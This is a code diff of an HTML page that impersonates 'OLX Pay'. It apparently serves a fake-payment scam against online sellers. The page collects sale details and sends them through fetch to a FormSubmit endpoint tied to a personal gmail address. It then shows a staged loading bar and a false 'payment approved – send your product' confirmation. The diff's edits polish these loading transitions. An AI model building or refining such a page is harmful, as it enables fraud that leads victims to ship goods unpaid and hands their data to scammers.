@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>OLX Pay - Confirmação de Venda</title>
   <style>
     body {
@@ -46,10 +46,6 @@
       border-radius: 5px;
       font-size: 16px;
       cursor: pointer;
-    }
-
-    .btn:hover {
-      background-color: #e65c00;
     }
 
     .hidden {
@@ -100,38 +96,12 @@
       margin-top: 20px;
     }
 
-    /* Animação de carregamento */
-    #barraCarregamento {
+    #barraCarregamento, #barraCarregamento2 {
       width: 0;
       height: 5px;
       background-color: #ff6600;
       transition: width 3s;
       margin-top: 20px;
-    }
-
-    .loading-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      margin-top: 30px;
-    }
-
-    .loading-container p {
-      font-weight: bold;
-      color: #333;
-      margin-top: 10px;
-    }
-
-    .loading-container img {
-      width: 40px;
-      margin-top: 20px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -161,6 +131,9 @@
     </form>
   </div>
 
+  <!-- Barra de carregamento entre formulário e comprovante -->
+  <div id="barraCarregamento"></div>
+
   <!-- Tela de Comprovante -->
   <div id="comprovante" class="confirmacao hidden">
     <h3>Pagamento aprovado – envie seu produto</h3>
@@ -174,7 +147,7 @@
     </div>
 
     <div class="center">
-      <span class="link-confirmar" onclick="iniciarCarregamento()">Clique aqui para confirmar a transação</span>
+      <span class="link-confirmar" onclick="iniciarCarregamento2()">Clique aqui para confirmar a transação</span>
     </div>
 
     <div class="footer">
@@ -183,8 +156,8 @@
     </div>
   </div>
 
-  <!-- Barra de carregamento entre as páginas -->
-  <div id="barraCarregamento"></div>
+  <!-- Barra de carregamento entre comprovante e tela final -->
+  <div id="barraCarregamento2" class="hidden"></div>
 
   <!-- Tela Final -->
   <div id="final" class="final hidden">
@@ -200,12 +173,6 @@
     </div>
   </div>
 
-  <!-- Loading container -->
-  <div id="loading" class="loading-container hidden">
-    <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
-    <p>Aguarde enquanto processamos sua transação...</p>
-  </div>
-
   <script>
     document.getElementById("vendaForm").addEventListener("submit", function (e) {
       e.preventDefault();
@@ -218,11 +185,22 @@
         valor: form.valor.value
       };
 
-      document.getElementById("produtoInfo").innerText = dados.produto;
-      document.getElementById("valorInfo").innerText = "R$ " + dados.valor;
-      document.getElementById("formulario").classList.add("hidden");
-      document.getElementById("comprovante").classList.remove("hidden");
+      // Inicia barra de carregamento visual
+      const barra = document.getElementById("barraCarregamento");
+      barra.style.width = "0";
+      barra.classList.remove("hidden");
+      setTimeout(() => { barra.style.width = "100%"; }, 10);
 
+      // Após carregar, mostra comprovante
+      setTimeout(() => {
+        document.getElementById("formulario").classList.add("hidden");
+        barra.classList.add("hidden");
+        document.getElementById("comprovante").classList.remove("hidden");
+        document.getElementById("produtoInfo").innerText = dados.produto;
+        document.getElementById("valorInfo").innerText = "R$ " + dados.valor;
+      }, 3000);
+
+      // Envia dados para o FormSubmit
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
@@ -230,16 +208,17 @@
       });
     });
 
-    function iniciarCarregamento() {
-      // Exibe o carregamento entre as páginas
-      document.getElementById("barraCarregamento").style.width = "100%";
-      document.getElementById("comprovante").classList.add("hidden");
-      document.getElementById("loading").classList.remove("hidden");
+    function iniciarCarregamento2() {
+      const barra2 = document.getElementById("barraCarregamento2");
+      barra2.style.width = "0";
+      barra2.classList.remove("hidden");
+      setTimeout(() => { barra2.style.width = "100%"; }, 10);
 
       setTimeout(() => {
-        document.getElementById("loading").classList.add("hidden");
+        document.getElementById("comprovante").classList.add("hidden");
+        barra2.classList.add("hidden");
         document.getElementById("final").classList.remove("hidden");
-      }, 3000); // 3 segundos de "carregamento"
+      }, 3000);
     }
   </script>
 
